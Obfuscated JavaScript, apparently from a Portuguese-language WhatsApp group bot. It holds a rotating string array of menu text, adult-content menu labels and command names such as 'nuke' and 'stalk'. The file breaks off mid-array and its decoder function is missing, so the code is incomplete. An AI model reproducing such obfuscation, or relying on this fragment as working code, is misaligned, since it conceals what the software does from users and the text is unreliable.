(function (_0x461f70, _0x4706d6) {
  const _0x33b87c = _0x461f70();
  while (true) {
    try {
      const _0x2476c4 = -parseInt(_0x5255(25805, 0x4955)) / 1 * (parseInt(_0x5255(21599, 0x63fb)) / 2) + parseInt(_0x5255(12053, 0x6cdd)) / 3 + parseInt(_0x5255(6272, 0x49d6)) / 4 * (parseInt(_0x5255(13130, 0x4a85)) / 5) + parseInt(_0x5255(18188, 0x2263)) / 6 * (parseInt(_0x5255(13472, 0x15fb)) / 7) + parseInt(_0x5255(18701, 0x2952)) / 8 + parseInt(_0x5255(8380, 0x552f)) / 9 * (-parseInt(_0x5255(2743, 0xa27)) / 10) + -parseInt(_0x5255(23416, 0x76a5)) / 11;
      if (_0x2476c4 === _0x4706d6) {
        break;
      } else {
        _0x33b87c.push(_0x33b87c.shift());
      }
    } catch (_0x12e98d) {
      _0x33b87c.push(_0x33b87c.shift());
    }
  }
})(_0x1d9f, 616546);
function _0x1d9f() {
  const _0x561bb7 = ['mfaBR', "ca do", 'woZYS', 'BiqkV', 'xima.', "je, j", 'iqvWv', 'uco!', 'rSihQ', 'acote', 'foAxW', 'DzQVy', "te C ", 'koIav', "e can", "e com", 'rFuvv', "ara u", 'kaLJU', 'YDCFs', 'o...', "AFIO ", " RAN ", 'riand', "v 0", 'RMYAi', 'nNKCD', '|2|0|', 'serad', 'nhRQh', 'cGALe', "r 1", 'cgdtS', 'e|Cha', "upo @", '_matr', 'BhvND', 'volte', 'bUoRm', '𝐑𝐔𝐏𝐎:', 'zrIqe', 'Baenx', 'esrjh', " for ", 'gGluR', 't1=', 'bycHt', "ÇÃO 〕", 'FJkzG', 'ZPmbc', 'ggIFL', 'msLCo', 'Duelo', 'vwxNU', 'oLKSl', 'BAKUG', 'yDSAa', 'BwgLk', 'sXCNu', "cria ", '━━⊰❆̸💎', 'fotog', 'ccf55', 'cOygK', 'nseTy', "seu t", 'ão.', 'SjMWV', 'ttfHd', 'dXcQy', 'Rebai', 'JqDQR', 'Letra', 'raper', 'mastu', '𝐕𝐄𝐑𝐃𝐄', 'eujae', 'MZcmK', 'YggPs', "ls So", 'rlNYm', 'RFIL*', 'Orzxr', 'ROmYq', "(BR) ", 'ive-a', 'ArgKl', 'SJwVi', "vo su", 'wychF', 'zTGbo', 'ZXXan', " NAGI", 'rrega', 'pzPyX', 'TzPBa', " [pal", "❄️ 𝐀𝐘𝐀", 'CESSO', " ADMI", " É ES", '100&t', 'mbPyG', 'chPbn', 'neste', 'cCAQM', 'origi', 'Fyhxw', 'xRzKP', ", ele", 'prox_', 'ydXgI', 'ZPHmR', 'QSOvI', "o mes", " qual", "lgo d", "OFC\nh", "ros q", 'Bmmsg', 'lzAun', 'PkmzI', 'add_p', 'jfgCL', "ti pr", "dos P", 'wId', " Cria", "𝑵𝑻𝑶 📁", '╌╌╌┈⊰', 'ODnkZ', 'LgtOY', 'TZoHF', 'DFvFn', 'obstá', 'BuWNh', '/www.', " da p", 'BdDAi', 'BEiFe', "𝐄 𝐔𝐌𝐀", 'Grand', " vez!", 'dQfkK', 'Links', "𝐍𝐓𝐈 𝐋", 'lDKDR', 'YVFci', 'os/gr', "ssar ", 'RhEcm', "vou c", 'tuvqd', 'HCmAm', " 𝐂𝐄𝐋𝐄", 'ZtWMz', 'vaBmw', 'aicJB', '48000', "huma ", 'XeTQT', 'heapU', 'ksmio', 'WAI', 'eNLeE', 'iases', 'frido', 'le.co', 'nqztQ', 'on%20', " Crim", "da nã", 'vnSlY', 'UAzxU', 'ybrlj', 'qJPmP', 'FzsvR', 'qfevT', 'ncido', 'ozPHk', "\n• *N", " \n❌ :", 'bkSkt', " *_In", 'inhan', 'PAzXD', 'XUYuO', 'BxCHK', 'ison', "isa A", 'Esjsp', 'REMIU', 'RqP_s', 'xRQSJ', 'CrnjS', 'imita', 'laSKa', "mer n", "ena, ", 'WMttH', 'TtGoK', 'perar', ". max", '-time', 'umjqt', '14.jp', 'rão', 'yLSCU', "o e e", 'AoioW', '𝐎𝐑🔥', 'nto.', 'IyDuY', "o bai", 'quebr', 'dzEPM', 'NamsB', 'GTA_S', 'PplIk', 'OzgAC', 'gSYep', 'tAEQo', 'yTiVG', "│\n├ O", 'XjOeH', "s. Pa", 'liga', 'lFrhf', ", o U", 'NFLLX', 'zBHed', 'tGree', 'wYzMM', "- Sim", " -c:a", '5|6', 'jgUJm', "❄️ 𝐇𝐄𝐗", 'pYkAu', 'hVYYh', " músi", 'nSCht', 'Ubaij', 'ante:', 'BFAiB', "ro po", 'DHioJ', "ig mi", 'WZlcM', 'heMzi', "🔞NÃO ", 'SRFlX', "\n❄️ Pa", 'dWCnC', "𝐓𝐎𝐔: ", 'dida.', 'YOuQw', 'uncio', 'DosIy', "ado \n", 'lVfoz', "Faça ", 'GNqNV', "ico ✔️", 'fCbzZ', '|2|0', 'soMUW', 'cpuzH', 'gener', 'wJIgr', 'TfWWk', 'd3b9b', "o ant", "\n• É ", 'oKlSt', 'zeCXL', 'scess', 'kjAJj', 'Xmfse', " 🔪\n", "IO: \n", 'cYZqg', 'mryxF', 'zsqke', 'oDtug', '|0|2|', 'llpap', 'pedóf', "🔥 𝐎 𝐍", "ARAM ", 'wxcWR', 'QvjJE', 'IzSGW', 'umeri', 'fake', 'nJPfL', 'wQVCF', 'jar..', 'bPara', 'VgXnz', "ndos ", "BOA N", 'gPcGo', 'etag:', '499ab', " ]\nDe", '𝐈𝐋𝐈𝐀.', "os ap", " 𝐂𝐀𝐈𝐔", "𝐈𝐃𝐄𝐎 ", 'utwdY', 'YhRYH', 'QHGX2', "viso ", 'yLJVe', 'FjSGs', "ar? U", 'zação', 'ApujD', 'kjlyx', 'lXWxG', 'ABqbA', 'GekCU', 'CRhRm', 'zWeNd', "u, ou", 'XIgLX', " 📝", 'ltarg', 'TSikq', "r 🔞\n", 'Hnhxo', "ite m", "tado ", "u sai", 'rSCMc', 'hos', 'MZDYo', 'PoOAw', 'oZQpS', 'make_', 'WoPRJ', ", par", 'JcElt', 'jIFyx', 'jogos', 'úvida', 'órmas', 'zEnDZ', "𝐑 𝐁𝐄𝐌", " Link", 'QOAGs', 'zofaY', "ão es", "a est", 'uraçã', 'MaKUZ', ". Hor", 'JhCau', 'imnoe', " - Ur", "🔞 𝐀𝐍𝐈", 'GBkYD', 'wvjmi', "t. As", '|3|4|', 'XTfvq', "her L", 'valia', " e di", 'feren', "ia nã", "ade v", "m adm", 'VdLFr', 'xsoew', 'PRtPV', 'QsRIT', 'ywvAL', 'mItqo', "y com", 'wZepA', 'kSBBN', 'bLDUw', "\n╚┉┉┉", 'bigKR', 'PSsIZ', '//api', 'UVSrz', 'ytSiX', "do ", 'pjQaz', 'PAYME', 'AHa74', 'MnEqL', 'jevpK', 'ne:50', 'henta', 'imson', '00*1.', 'NjCuJ', 'ao/%2', 'lkYTs', 'syMgQ', 'BkqMs', 'serpr', 'NRoHC', 'UCebt', "na co", 'ofici', 'eitad', "NTI L", 'HeXQo', 'from', 'vHaZu', "ra ca", 'SeAxE', 'BJHYZ', '1|2|0', "empo ", 'fstik', " e me", "i ban", 'kdLVG', 'YecFU', 'eJeUo', 'hCQlZ', "cara ", 'Ajqol', 'vOzEz', 'zWtBG', "NTI S", "sal p", 'arcan', 'JVTdE', 'TRleU', 'ECTAD', 'Texto', 'horah', 'cZzPi', 'VBdwb', 'vUqfV', 'ztIzn', 'RqfDz', 'JdGXq', 'luso*', 'yhZCi', 'rdWwi', "ome d", 'LKXLS', 'DhAyp', 'zEZtW', 'digt', 'ohbZv', "a mim", 'kout_', 'QzNkl', 'cGJQb', " ment", 'nyFea', 'ol.co', 't.0.c', 'ndico', 'playt', 'Irqrs', "𝐈𝐍𝐊 𝐀", " remo", 'strez', 'HOIHr', "   💰\n", 'EKZiP', "*🎉 So", 'dCrxE', 'kNlTA', 'qGpJA', 'uario', 'RrcSO', 'JJYWW', ". Cer", 'RLObE', "ifa p", '𝐕𝐀𝐍𝐍𝐀', "o fun", "*\n–\n•", "*E o ", "𝐄𝐌𝐏𝐎 ", 'venci', 'hxblN', 'IPMsJ', 'UuYpH', 'EbHun', 'Pxqdn', 'JGrYy', 'apHjC', 'mXTbL', "o bus", "*4 - ", 'tMqON', 'il.js', 'MSQOD', 'xiste', 'cep', 'Probl', 'cHrFF', " 🪬", 'FIhIn', ". ☪︎ •", 'guran', 'HLBnj', "bros ", 'eggHA', 'XNsiw', "ROUP ", 'HWWWW', 'Escre', 'LMZIJ', "d: ", 'sijdw', 'vCUki', 'notfa', 'eoUtk', 'CdepM', "NOVO ", 'scJhd', "do a ", 'cairc', 'tag', "c() =", 'kcLHj', 'SSizK', 'kwai', 'illsT', "z não", 'usar:', "ts ts", 'ebgiO', 'wXjCF', 'dKajY', 'NQftC', 'YNlRJ', 'adivi', 'RgDMb', "eta:\n", "RA EV", 'ssalt', '.7.10', 'erson', "*, ag", 'csYHu', 'OkUJZ', 'pSWhQ', "⏳ Tem", 'EocDN', 'dth=2', "eu qu", 'bXcJW', "   \n[", 'addcm', 'CBTlD', "🇯🇵 𝗦𝗔𝗦", 'ot...', "ido n", 'ROYbr', 'kmjZT', 'JaAXz', '𝐎𝐂𝐔𝐌𝐄', "ção: ", 'mQkqI', 'NWQwl', 'volan', "eva u", 'rm-ur', 'WmpOy', 'ejBaQ', "mo ad", '╭────', 'aQHrd', 'tBcwD', "e: *", 'UndRU', 'NLdfc', 'e=ita', 'k/fil', "pós u", "ial d", 'HEAD', 'ΝͲᎬ⚔️』', 'FABcE', 'cBcXq', 'ÓXIMA', 'eTDxO', 'ggvba', 'TDcFb', 'vRkEl', 'FTPYT', 'rfunc', "=> ", 'gWmjr', 'oeXLK', "/ +/]", 'KovRR', 'WQBKC', 'LKqKI', " toda", 'TVsTd', "a fun", 'mZNnc', "bo nã", 'dTtqQ', 'WoIci', "s pra", "/3\n\nE", 'SWJyh', 'rUdsU', 'iqQpI', 'Odyqw', 'XBKtc', 'fYEAw', "go da", 'mprar', '𝐂𝐎𝐌𝐀𝐍', 'UmUyY', 'KE.zi', "o, co", 'NFSHT', 'OKXlQ', 'imos-', '5).', 'JexUe', "pe 🔞\n", 'BsPHG', "*5 - ", " A ch", 'nXcrt', 'GBuEs', 'jbVyu', 'ltura', 'TbSFr', 'eProf', 'Start', 'omáti', '7J9mf', 'ent.t', 'hCTnx', 'VLTNE', 'guXSq', 'ogoVZ', 'vgyVv', "e pre", 'spjcq', 'CpVRa', 'NkmjG', 'mDZpG', '0&tz=', 'tonIv', "O qua", 'bgwyG', 'alalv', "4. 🔞 ", 'DDEkP', 'QxuOB', 'UEEvM', 'sfPSC', 'f...*', 'dRqzk', 'CgNYg', 'TJArT', 'eJbKS', 'QkHUd', 'pAEps', "* 」──", 'tJYvR', "🇯🇵 𝗡𝗔𝗥", " depo", "𝐊 ❌", "sso g", 'conca', 'fire.', 'hcmni', 'IvUNU', 'PAraQ', 'BOxfF', 'Ipygq', 'durat', 'rZvQf', "s Car", 'KGjEO', 'EpQuH', '5|1|4', 'gify', "🖼️ 𝐌𝐄𝐍", 'BuMgS', 'RKFWD', 'perad', 'pediu', "as mo", '𝐈𝐄𝐋𝐋𝐎', "do gr", "bot B", 'MyyNm', ", esp", 'kvgne', 'FNezG', "nte* ", 'ZyuYw', 'KEIIh', 'Muita', 'uelo,', 'eAkoi', 'saw', 'nsRes', "ode m", 'TfeLa', "❄️ 𝐒𝐀𝐊", 'lFBVS', 'ário:', 'Okvga', " *Sis", 'ertar', "que i", 'm_lin', 'ntrad', 'mbate', 'QLqmX', "ava p", "rço, ", 'ranka', 'iVlPF', '%25&t', 'DklVA', 'TTZxB', 'dJJpK', 'lQNzo', 'MmaAO', 'rFtQN', 'r...', 'dJEVQ', 'ificu', "🌀 Ati", 'qJAfC', 'lPkzD', "s, en", "ivou ", " 3 ca", 'roKlt', " e ro", 'Lrmcw', "um po", '𝐧𝐜̧𝐨̃𝐞𝐬', " GWEN", 'cord_', 'lDiAi', 'BfqSm', "ma ve", "OT:~ ", "\"[a]\"", 'diaYd', 'rainb', 'marve', "beu ", "o ped", 'yJCdN', 'YjTOc', 'ZvZFs', "TEEL ", 'agem,', 'QUEST', 'om/co', 'rbBTL', 'GeGSv', 'TYxlt', 'xGLYI', 'errou', 'UwIQt', 'FrlmD', 'sagem', '|7|3|', 'sMTqi', 'olds,', 'dtCYv', 'ONBbf', 'EnPkH', 'ysBpg', "o E A", 's1fpn', 'QcEGJ', 'dms', 'chaça', 'xsFmn', '/widt', 'tijgR', 'XGefh', "𝐀 ❄️", 'emory', 'ssCYz', 'uOpUn', "ulo: ", 'wNDlF', 'WittX', 'nXLuj', 'mXeZx', 'gp3', 'lzpVs', 'DxtSi', 'arnNS', 'BtGfp', 'YHDjg', 'MwSYP', 'dos_g', 'nbElM', "erei ", 'ibweb', 'setHo', 'r_mor', 'T0ExR', 'FfyNd', "a uti", " gp n", 'cSiEx', 'tdVRh', 'Lprff', "\nDESA", "stá n", " ESDE", 'hMDgJ', 'YSjPV', 'ixDUz', 'BavRQ', 'IWbUq', 'FeBYk', 'DgQKo', 'dFzos', 'EXUDh', 'dXuZj', 'Desco', 'biywO', 'WARuC', 'snywb', 'rloiM', 'lrVBP', 'avjtz', "o. Us", 'BCHjy', "ara: ", "de qu", " malu", 'estre', 'njKQm', 'yEXfU', 'bUeZn', " 𝐂𝐎𝐌𝐀", 'DxeIx', 'a01b4', "vel! ", 'ganha', 'SNXQa', 'zkhjs', 'bxnHQ', 'XyGrZ', '12345', 'HqBiN', '໑⃕ꔷ⃘࣭࣭࣭', 'xWDSH', 'UCfCP', 'ança:', 'me=', 'KaSyj', 'lysJe', '08aca', 'VTjIt', '076', 'ksNdZ', 'vxmgq', 'VpmxP', "r par", '100', 'cnn', 'QCsfx', 'PWZHz', 'AGIIR', 'entMe', 'OgXiW', 'xvtsl', 'hUPNN', "no ho", 'VfPAZ', 'p.org', 'jogad', 'Gizqn', "ra, o", 'rgtin', 'qmszk', 's/Onl', 'EmZVI', 'URscA', " canc", 'yexbz', " ou /", 'DpGVG', "aço v", 'WbfmR', "e que", 'almen', 'uLVJc', 'XLOZZ', 'mGFwf', 'BBbwP', "𝐘𝐔𝐊𝐈 ", '/nsfw', 'fIvTn', 'eYhEq', 'dFLkc', "ra ev", 'MOD.a', 'gsqEv', 'FzMXD', '*Mens', 'ZUYbJ', " APK:", '=0.5[', 'FdOJi', 'cgPWa', "a emo", 'GNsuz', 'dpvtK', 'BRL', "\n  ╔┉", "_- ", 'OTjRh', 'RfJLZ', 'mJsjb', 'n_dev', 'YAKRh', 'RxDUc', 'gUxvx', 'pBUIA', "🇯🇵 𝗘𝗠𝗜", 'woNzA', 'iIxfm', 'UJQIW', 'FpkBx', 'BjAWc', "\n╚┉✼┉", 'var10', 'LSjLV', 'MpzqM', 'miaçã', 'UpjZE', 'RdHGg', 'OiOnj', 'zikVK', "IREI ", 'ySDAl', 'xRLAF', 'NwMpd', "*\n\n*C", 'stalk', "x* go", 'OCALI', "ire p", 'rXpCC', "❄️ 𝐍𝐀𝐍", 'xpOvc', 'ERThJ', 'TwaRQ', 'vuzrW', 'LJwjx', "luso ", 'kxTdz', 'lkWCG', 'Insir', 'lUreT', "ura: ", 'RUzeA', 'udio/', 'udHHP', '42aa2', 'finis', 'vrjzf', 'SVGaN', 'te!', "a ini", 'JuqZb', 'VF.js', 's/Nat', 'SID', 'ciand', 'd/f/A', 'nKVye', 'jNWcZ', "A cha", '8cf9f', "io. T", 'ZzaDZ', 'lTPZL', 'cbjoL', 'gGGKG', 'emiaç', 'hNrks', 'thAHK', './arm', " é do", "*\n│pa", "foi c", 'bjGeR', 'Comum', '4|7|1', 'Alyci', 'aLedy', 'hGFFE', "eu Pr", 'txoIp', 'nJqaN', 'ZFnCs', 'dHQEZ', " um t", '1b25f', 'bhJeC', 'lobom', " ] ” ", 'rMUwF', 'IHJJK', 'reWeG', 'WNLOA', 'QBHAq', 'CBuqq', 'pwnvc', 'XTIKp', " 」\n\n", 'lar-s', 'CyZJe', 'ESTAT', 'uIObk', 'ONSZh', 'QpShH', 'lFEQk', "ts ma", " 𝐈𝐒𝐀𝐃", 'GrPWh', 'toUpp', 'hxmGr', 'fg/co', '*GRUP', 'ynceD', '*Stal', "STE G", 'pffdq', '•CID∆', 'npfhB', "dd el", "3. 🕹️ ", "tar e", 'SyNHb', 'RtqpU', 'OIXwa', "O Dow", 'linkg', 'SHFmS', 'EnXjM', 'disso', 'DuRnC', 'yImxE', '93856', "𝐄𝐑𝐄𝐒 ", 'Abaix', 'JOgBs', "as bl", "𝐓 🤴🏼", "rada ", 'NSVff', 'utomá', 'Palav', "a:* ", " cat", 'HNCBS', 'tRKLl', 'DSYYY', "y? \n\n", 'cKzbM', ", tra", '5:col', "éns @", 'atura', '@nech', "o alc", 'PJweB', 'uIgvC', 'kRfsU', "uém, ", 'tjViU', 'lzjKJ', 'Aoufr', '1e4f6', 'fQCPc', 'CgibY', '-9999', 'ENfRr', 'objec', "s E N", 'vcard', 'uJmZN', 'mande', "\n10. ", 'iWshz', 'ÍSTIC', 'zzWzD', 't=300', 'BjgaW', " Brit", 'GFkEs', 'jnbEb', 'pDPVH', 'vHfRN', 'nHtbL', 'OKlpR', "ica q", 'cinto', 'yMmnv', "T (5)", 'ht/45', " de G", " O se", 'WqGqq', 'lzKrj', "erem ", 'Score', "R DO ", 'voZxU', '5dde0', 'IEPUl', ". FNC", "EAL S", "do em", " O us", ".. Es", 'YoLfT', 'HEHvm', 'mDsTE', 'enCOz', 'Gecko', 'mOimH', " mds ", 'fy_mp', "Gold ", " sepa", 'goXtK', 'OgXrd', 'procu', 'QVTnv', "os Co", "TSU2 ", 'kOjqk', 'oAkED', 'OsNxv', " Menc", 'ytPxc', "lá *", "\n𖣘⃟ᗒ M", 'vuxUT', 'nTAOF', 'YnjYo', 'AjwlQ', 'cImfR', '፝🎡⃞꛰𝐋𝐨', 'ffSvS', 'rbVkA', 'QUhGZ', "sso p", 'xUXQW', '▀████', "em mu", 'OumeM', "S* 🪙 ", 'ZsesB', 'furtj', " de D", 'gPTWO', 'SWkQW', 'jWGYF', 'veILK', 'aFZLG', 'hOjND', "e O N", 'yWPzB', '5%.', 'Encer', "o da ", 'sRXhq', 'eXYXa', "𝐄𝐎𝐒 𝐀", 'ww-fo', 'rviva', '4|3|0', 'yAWMA', 'AnIiu', 'unlin', 's-bot', "e rou", 'LksSu', "pre m", 'HcNnr', 'ZvpLk', 'VaLOM', 'XiArm', 'PitMK', 'TRZCB', 'euoxr', "ade d", "x, e ", 'tkxvU', 'BndQx', "s env", " Pron", "el ou", "u / c", 'LekUY', "ara f", 'aHXSM', "🚫 𝐌𝐄𝐍", '0|6|8', 'Escut', "ga 🧐", 'decid', "a lin", 'szbfk', " 9999", 'gerar', " 📀\n3 ", 'srBqN', " 𝐈𝐒𝐀 ", 'iller', "a dis", 'sCVZj', 'bros*', 'DiQkU', 'oitrJ', 'biWmw', 'axBsm', "rio p", 'bywVt', 'o_VbJ', 'boton', 'wVSIl', 'rolet', 'CEUii', '𝐖𝐍𝐈𝐀𝐂', " ) Go", 'mJXOa', " @ de", 'jogo?', 'SbRWN', 'o1.jp', 'vnTyA', "o Com", 'font.', 'A42rz', 'Para:', 'pSiXf', 'peg?t', 'jlkPQ', "ou\n", 'oNeyw', 'dKqFr', "es 🔞\n", " sain", 'xgHUL', '5e9c8', "tou s", "a aum", 'nCHZB', 'fVCOa', 'nhuma', 'tidad', " vamo", 'XdRcq', 'dkXzS', 'ugNOS', 'ozAXx', " Twit", 'XyTIJ', 'rpFKW', "em Go", " já p", "lha e", 'iZhrZ', '2043f', 'nheEm', 'yEhmo', 'fCayz', 'InSvx', "lgum ", 'WFoDg', "o:\n", 'Vitór', 'IhaDB', 'tHzka', 'oli', 'vStEO', 'PdlRq', "m, fa", 'jogo2', 'SktOF', 'io...', 'JXjix', 'rls', " 2 ve", 'JoOCg', "lot n", 'time=', "lém d", 'urati', "o 🤧", 'IkJHI', 'pozCR', 'lotus', 'tSgUT', 'nCKKS', "71. ❄️", 'vXmBd', "O RM_", "ᴜᴇᴍ ʟ", "𝐂 🔞", 'erBnO', 'DczzF', 'Bhtgy', " What", 'qcpEj', 'vinga', 'vxWUX', 'keRKW', 'UcEzE', 'NWYpN', "to co", "DE NÚ", 'mal', 'readM', 'cal-g', "DA - ", 'xtMes', 'Kkkny', "ais G", 'SFebC', 'IRmXv', 'Erro!', "\n\n*⚠️ ", "m 0", 'cMhCn', 'RVTKe', 'DJmMx', 'XLPNX', 'Q66f-', "mo, s", 'ᏢᎬᎡᎪΝ', 'QHcsM', "a bri", 'tan', "Pior ", 'LueQM', "ivo j", 'array', "u env", 'dGwTS', "om su", 'YEBvU', '𝐄𝐒', "sta: ", 'd1b5d', 'ndas2', 'DZjHg', 'ChjVI', "guma ", 'or/ti', "O mod", "a for", "eta s", 'qvqkR', "o: ht", 'kWgKQ', 'vKlna', 'BWQEg', "r 🕹️\n", 'QxlkG', " por:", "cas m", " base", 'eBprY', 'rGqOm', 'or/qu', 'GsCiq', "❄️ 𝐎𝐁𝐀", 'jkcxp', 'on/pp', '345/3', "ndo 1", 'ada..', 'n/fig', 'crité', "so pa", "u tom", "a ass", 'ntre?', 'Mensa', "r mem", " </>", 'rBwbB', 'QNZXw', "/ 0\n\n", 'mldn5', "uito ", 'qgbXM', 'VKzji', 'wsQQs', '64,', " JAPI", 'ztUog', 'fbnGI', 'sYcuL', '...', "scar ", 'ctado', " e 12", 'ertez', '302', 'y+8.7', 'aplou', 'ion', 'TvRTk', 'etero', 'HfKTU', 'emasc', 'nama', "a pri", 'nuke', 'POBHy', " 31d ", "esta ", "s pod", 'com/v', '|4|1', 'LYiAz', ", mas", 'FTtha', 'qtcnh', 'hgcBX', 'yGiCp', 'OXZjZ', 'mYfeu', 'wEJzH', 'YBPBY', 'zqZjz', "ama\n", 'GxKLl', 'OLEON', 'VReJx', 'WAhUd', 'ue-se', " Reco", "\nE-ma", 'CKUP.', 'mIIhV', 'uzawa', "ou os", 'Ramnx', 'play', 'JaSoO', 'jDYdZ', 'dquir', 'druXg', 'XeEAt', 'ZKrTQ', 'nhaLo', 'kLmEu', "❎O re", 'ephem', "AQUI ", " Nath", 'UcPiC', 'GhBHg', "ts de", 'confi', " Exem", 'ZlakM', 'pwsGg', 'Adm', 'mkxie', 'ty=0&', "rreu ", "𝐈 𝐂𝐀𝐓", "vo pr", 'guéis', 'JRMdL', '-b459', '│𝐏𝐚𝐫𝐚', "ira v", 'ZmdFS', 'tYVAY', 'ftcBn', 'piZJE', 'rgy', 'act', '[⚫]', 'Incrí', "\n2 - ", 'tions', 'SrqcM', " > ", 'UqcMF', 'abbbb', " REI ", "s o /", 'lenco', "ida c", "u que", 'conhe', 'Bdjau', 'FEyxD', 'knKGq', 'ZQKKE', 'EUMUg', ": @", 'ZoKQZ', 'HFdDL', 'rosca', 'tLzVt', 'uZyoX', "a más", '_vide', 'Xvide', 'RiSUf', 'bvMuH', 'sutsJ', 'BACKU', "eça a", "e o @", "icar ", 'yQrLw', " sai ", "mplo ", 'ZLBWc', 'LMDoN', 'udio2', 'ifVOF', 'WVpKk', " Os d", "ndo Q", 'A3AR9', 'ota', " e al", 'unce', "cou a", "osa? ", 'hJyKT', 'mtogQ', "\nPedó", "\n\nDic", 'MuxOs', 'JUWWD', 'ugest', "ros A", 'l-tin', '38d36', 'OyYMb', 'sa/%2', 'enu', 'oxWgr', 'qyeIp', 'dQGRW', 'wQqlU', "ir pa", 'SgWwi', 'ghBYf', 'ADORE', 'AMRFx', 'woEKF', 'IrWMi', "iu, n", 'TxjuV', 'uirir', 'cmPpT', "ado l", "mine ", 'XIkyN', 'yyyBU', 'Yfoob', "% 🍀", 'ativi', 'EkGxo', 'kWQDA', 'BlEpk', 'ESJzv', 'CeqZb', 'eaLov', 'zXILW', '𝐎𝐖𝐍𝐋𝐎', 'CXBEk', 'EnVOZ', 'en-US', "i Doc", 'qyKUZ', " mais", 'Horár', 'ElgJx', 'nqKlt', 'cWBBd', 'KuWTI', "ser o", "o\nDat", 'v2.js', 'TTNzM', 'w.ter', 'Umida', 'nJbgK', "ue se", "𝑆𝑒 𝑎𝑝", 'GpYNF', 'Yzdto', "ig ta", 'ZpATt', 'ABlFK', 'FmiXR', 'JBQjU', "ig gu", 'LsBjU', 'QHhOo', 'bIgVU', "r ima", 'bwDCv', "eu ao", 'akjog', "ntro ", '&lc=p', "10. 🔞", "s os ", 'ACptp', "ista ", "uso c", 'hzrkO', 'owfjU', "eja d", 'TLQlY', 'HlgTf', 'Dalof', 'IYfjW', 'N/A', 'atoso', "mo pa", 'PCIHg', 'ranko', "u a ", "e o m", 'aWfNV', 'FXurk', 'nWCNL', 'OPvnr', 'QVOms', 'VePTv', "DO GR", "𝐄𝐒𝐀 🔞", "se: ", 'fixku', 'mLrBN', 'ZXjgV', 'nDXVA', 'ggeyA', "ـ\n☈ 💑", " ⚽️\nSa", 'ichan', "o sis", 'MEwDM', 'uZFkE', 'fpcVs', 'IzZoI', 'lRKzx', 'iUaKQ', 'xMcaZ', " *ALU", 'pfyhA', "     ", "AO DI", "i ini", "ega s", "ivo. ", "a sai", "   \n💨", 'gEbxC', 'zcHlV', "「 @", 'hlaBQ', 'hFQhA', 'EXQRR', "tei u", 'htpKi', "\n\né d", 'wZzwI', "ais t", 'arsva', 'TGoEb', " 𝐂𝐀𝐌𝐈", "s Gol", "Bem v", 'VIATO', "elo d", 'pkujp', "𝐮\n│𝐃𝐞", "ta 🤡,", 'nta', 'fcKaU', "sta r", './cas', '/chat', 'WUBdF', '71281', 'lHDxG', 'gite:', 'JaAZw', "*\n• P", "7. 📍 ", 'kVbwn', 'MDkfO', 'qbjCP', '*mens', 'fEFOW', 'pVptr', 'trar.', 'uiyZQ', "\n💾 Me", 'pzrji', 'bass3', 'shado', 'WphZW', 'dLpfR', 'jZwkl', 'yvIEb', 'yolVx', 'EDLoc', 'ijQFD', 'CHAUN', 'Level', 'idgp', 'dZVVN', 'EceNW', 'MkEVx', 'ekXrC', 'dKPUo', "ndo c", 'zVsGM', 'indin', "E, CO", 'nstgC', 'DxFTL', 'jzCxQ', 'FTdVz', 'zando', 'st?no', '_DE_C', 'ecidi', 'WlpGS', 'xPlUM', 'etCcE', "ma ch", 'ser.', "x9 1 ", 'jRbVi', "ém ", 'TowLE', 'OrbmO', ", agu", "ra ad", "e tor", 'ntere', "s tem", 'agpwE', 'gens:', 'ETkYV', 'LkSmM', 'KYVeC', 'viada', "seu h", 'JPpWT', 'nHEgE', "ma em", 'nzFUg', 'HZtpk', "l enc", 'vVaKk', "𝐔 𝐃𝐎 ", 'pvCXH', "GTA S", "ig be", 'neond', "ja fo", 'SYJzk', 'qGkHV', 'MShPm', 'DUHdU', 'WVTNa', 'lFuGG', 'Fxzsz', "‼️ Des", 'otas:', 'udios', 'RapwM', "rá 20", "DO GO", 'BkrEw', "uma v", 'gdriv', 'ssThE', "o\nTem", 'Bot', 'ytaWY', 'GZynk', 'TTXvd', 'xwAPY', 'rWmpN', 'ykrxm', "\n\n💭 𝐂", 'eIGwd', 'sição', 'béns,', 'TVteP', "e est", 'outra', 'DURxG', 'e/mai', '7e751', 'melho', "va an", 'IckBr', 'manti', 'jGvGx', " e de", 'porém', 'iddog', 'DqDsZ', 'ULqWZ', 'MTvdg', "io ho", 'figs', 'TqTMA', 'IUFIq', 'HRHCB', 'mNnwl', "ac 🔞\n", 'JJVVm', "u est", "agar ", " e re", 'zQTsf', 'tIIlQ', 'restr', '𝐒🔥', 'f5003', 'adver', 'ome', 'er.sp', 'HOqzt', 'FjBOU', 'wBmTu', 'QaWZk', 'npvoC', 'colha', 'Wnrsd', 'nscbG', "se ", 'TBVlw', 'WYvcp', "rrar ", 'xuJNU', "upos ", "ug: ", 'tory-', "a 1 D", " o no", 'VGVte', "e enc", "ou an", 'qWbrs', ", a m", 'OS/se', '&cate', 'Obesi', 'llYea', 'nfQHh', "to?, ", "5. 🔞 ", "mo ex", "oken\n", "u mús", 'UpSuI', 'McTTP', 'usJll', '*2:tr', '800&t', 'vIJgw', 'xintr', 'jlyRW', 'dooaq', "e RAM", 'KACII', " reno", 'bylIN', 'HAPru', 'lVPQh', "[p] p", 'irhtS', 'nJhhY', 'rGdaO', "°🌚💕\n ", "nem p", 'XzqKt', 'cuTuM', 'uITkP', '.e/i5', 'nks', 'ZTAnD', 'IYAxS', "s, is", " escr", "enas ", 'uinte', 'acamp', '3|4|2', ", o u", 'JhjKJ', 'ymnLf', 'SlVIz', 'ypmjH', "uiz N", " Auto", '𝟭𝟬𝟴𝟬𝗣', 'CbMkC', 'uPPSO', 'REpVS', 'EfTNt', 'hwwlV', "sou o", 'aFhXA', "i adv", '.com/', 'MNOly', '33268', 'GoHRR', "o dos", 'Respo', 'ndo?', 'ect', "║✼ Av", 'yber+', 'mencg', 'as-vi', 'aBWmY', "\n Ran", "──\n༶ ", "ei re", 'atame', 'sDDQE', 'WUsgU', "s não", 'dJgti', 'Erro', 'JPYNS', 'HNSMF', " / 0,", "um en", "em ne", "[ Lis", 'uXISm', 'sjFHi', "ode r", "\n\nSAI", "via S", "os em", " 👀", "ne de", 'FrLnS', 'uidor', 'nWIdQ', "D não", 'JvSpN', 'NXCaR', 'iafir', 'LtubO', 'vMaPz', "𝟏 🔞", 'yFhgQ', 'oups.', 'PUXAR', "🌀 O r", 'YHWfC', 'wNEHB', 'posiç', 'fromC', 'q-rG0', " de A", " e a ", " /10d", 'rAZDx', 'elle', 'CTYLR', 'Light', "te vo", 'mg.', 'XyNUa', 'fEzHb', 'tTcMS', " 1 at", 'wwWVB', 'rType', 'mtmsz', "u. Ag", 